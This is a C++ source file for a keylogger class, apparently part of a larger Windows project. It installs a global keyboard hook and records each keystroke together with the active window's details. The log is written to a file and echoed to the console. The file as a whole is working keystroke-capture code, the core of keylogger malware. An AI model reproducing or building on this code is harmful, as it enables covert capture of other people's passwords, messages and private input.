#include "../../include/keylogger.h"
#include "../../include/hook_manager.h"

#include <fstream>
#include <iostream>

Keylogger::Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo& windowInfo, KeyInput& keyInput)
    : _outputFile (std::move(outputFile)), _manager(manager), _windowInfo(windowInfo), _keyInput(keyInput) {}

void Keylogger::Listen() {
    this->_manager.SetTerminalVisibility(true);
    HookManager::InstallKeyboardHook(this);

    keepRunning();
}

void Keylogger::LogKeyStroke(int keyStroke) {
    if (_keyInput.IgnoreMouse(keyStroke)) return;

    std::stringstream output;
    _windowInfo.GetActiveWindowInfo(output);
    _keyInput.FormatOutputBasedOnLogging(output, keyStroke);
    writeToOutput(output);
}

void Keylogger::writeToOutput(std::stringstream& output) {
    _outputFile << output.str();
    _outputFile.flush();

    std::cout << output.str();
}

void Keylogger::keepRunning() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
}